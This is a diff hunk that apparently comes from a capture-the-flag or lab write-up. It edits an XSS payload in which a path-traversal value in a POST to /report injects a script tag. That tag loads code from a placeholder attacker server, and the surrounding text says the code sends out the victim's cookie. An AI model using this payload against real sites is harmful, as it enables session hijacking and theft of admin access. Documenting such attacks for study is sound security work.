@@ -95,7 +95,7 @@ Then the payload loads a script from the attackers server, which sends the cooki
 #### Payload
 ```http
 POST /report?q=/admin HTTP/1.1
-id=3../../../search?q=<script%20src="http://your-server.com"></script>&message=as/admin
+id=3../../../search?q=<script%20src="http://<attackers_server>"></script>&message=as/admin
 ```
 #### Payload Script on Attackers Server
 ```javascript
